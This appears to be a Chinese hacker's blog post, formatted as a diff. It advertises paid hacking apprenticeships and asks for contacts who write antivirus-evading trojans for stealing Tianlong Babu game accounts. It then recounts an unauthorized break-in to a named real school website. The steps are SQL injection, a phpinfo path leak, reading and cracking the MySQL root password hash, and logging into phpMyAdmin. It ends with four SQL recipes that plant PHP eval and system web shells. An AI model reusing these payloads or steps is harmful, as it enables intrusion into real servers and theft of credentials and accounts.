@@ -1,0 +1,152 @@
+有人咨询我收徒弟  我再说一下 现在还收  要自己想学的 
+收费和不收费徒弟的区别说一下 
+ 
+收钱的徒弟 第一 我教什么学什么（这个我会安排课程） 第二 你想学什么 我给你视频 或者 相关知识  方便的话 我就自己录制视频帮忙解决
+第三 ：收费的徒弟  提供长期在线指导    
+ 
+我不教抓鸡盗号  我也不会
+如果有盗天龙八部号的 或者认识写天龙八部盗号马 会免杀的 帮忙联系下   因为玩黑之初的目的就是为了盗天龙八部号
+可是一直不认识写天龙八部马的 要可以给测试的
+ 
+一站  http://www.dyyz.net.cn/   我在学校拿毕业证的时候给的 好多天了  一直没碰 不方便
+拿了毕业证   回到公司
+第一眼看去 好像全是html静态的  都知道静态的根本不好日 
+多点击几个专栏
+发现这个 http://www.dyyz.net.cn/celebrate/list.php?id=3
+http://www.dyyz.net.cn/celebrate/list.php?id=3-0  没变化
+http://www.dyyz.net.cn/celebrate/list.php?id=3-1  另一侧信息
+判断存在注入
+常规手工不行   尝试突破也不行
+工具穿山甲 
+可以注入：root权限  
+那么想可以通过写拿shell  
+root写shell的几个条件
+第一种方法：直接写马(Root权限)
+条件：
+
+1、知道站点物理路径
+
+ 2、有足够大的权限（可以用select …. from mysql.user测试）
+
+ 3、magic_quotes_gpc()=OFF
+
+
+select   ‘<?php eval($_POST[cmd])?>’   into outfile ‘物理路径’
+and 1=2 union all select 一句话HEX值 into outfile '路径'
+
+可是条件3不符合      法写shell  不过服务器存在 phpmyadmin  御剑扫到的
+尝试万能密码：帐号 'localhost'@'@" 密码空  登录失败
+ 
+试着爆绝对路径：
+phpmyadmin爆路径方法:
+1./phpMyAdmin/index.php?lang[]=1  
+2./phpMyAdmin/phpinfo.php  
+3./load_file()  
+4./phpmyadmin/themes/darkblue_orange/layout.inc.php  
+5./phpmyadmin/libraries/select_lang.lib.php  
+6./phpmyadmin/libraries/lect_lang.lib.php  
+7./phpmyadmin/libraries/mcrypt.lib.php   
+8./phpmyadmin/libraries/export/xls.php 
+ 2.11.9.2
+phpmyadmin/libraries/List_Database.class.php
+ 
+好像都没成功 
+御剑扫到的
+http://www.dyyz.net.cn//phpinfo.php    获得网站路径：D:/www/phpinfo.php 
+还扫到几个敏感东西：http://202.103.49.66/Admincp.php
+ 
+权限为root  知道网站路径  不能直接写shell
+ 
+想想 root还可以读  读到root密码 进phpmyadmin  也可以拿shell
+好象是http://www.dyyz.net.cn//phpinfo.php   
+泄露了D:\phpStudy\PHP5\php.ini 
+自己修改好读root密码的路径   D:\phpStudy\MySQL\Data\mysql\user.MYD
+成功读到root密码：
+17---- r(0072)
+18---- o(006f)
+19---- o(006f)
+20---- t(0074)
+21---- *(002a)
+22---- 8(0038)
+23---- 2(0032)
+24---- E(0045)
+25---- 1(0031)
+26---- C(0043)
+27---- 5(0035)
+28---- 8(0038)
+29---- 2(0032)
+30---- 8(0038)
+31---- A(0041)
+32---- 9(0039)
+33---- B(0042)
+34---- 5(0035)
+35---- 4(0034)
+36---- 8(0038)
+37---- 6(0036)
+38---- 4(0034)
+39---- 9(0039)
+40---- 1(0031)
+41---- 1(0031)
+42---- 5(0035)
+43---- 3(0033)
+44---- 5(0035)
+45---- 9(0039)
+46---- 8(0038)
+47---- F(0046)
+48---- F(0046)
+49---- 4(0034)
+50---- F(0046)
+51---- 0(0030)
+52---- 3(0033)
+53---- 2(0032)
+54---- A(0041)
+55---- 4(0034)
+56---- A(0041)
+57---- B(0042)
+58---- *(0044)
+59---- *(0035)
+60---- *(0041)
+61---- *0032)
+ 
+拿去解密：查询结果：  
+centwww2*** 
+服务器 Windows2000 的
+没尝试社工  不是linux的不存在ssh  不过也可以尝试 3389终端，ftp 密码等等去登录
+ 
+成功等入：phpmyadmin
+ 
+
+
+
+ 
+
+
+
+phpmyadmin拿shell的方法：
+ 
+第一种
+CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
+INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES ('<?php @eval($_POST[pass]);?>');
+SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE 'd:/wamp/www/darkmoon.php';
+DROP TABLE IF EXISTS `darkmoon`;
+ 
+第二种方法
+Create TABLE moon (darkmoon text NOT NULL);
+Insert INTO moon (darkmoon) VALUES('<?php @eval($_POST[pass]);?>');
+select darkmoon from moon into outfile 'd:/wamp/www/darkmoon2.php';
+Drop TABLE IF EXISTS moon;
+ 
+第三种方法：
+select '<?php @eval($_POST[pass]);?>'INTO OUTFILE 'd:/wamp/www/darkmoon3.php'
+ 
+第四种方法
+select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE 'd:/wamp/www/darkmoon4.php'
+127.0.0.1/darkmoon4.php?cmd=net user
+
+ 
+ 
+ 
+ 
+ 
+ 
+  
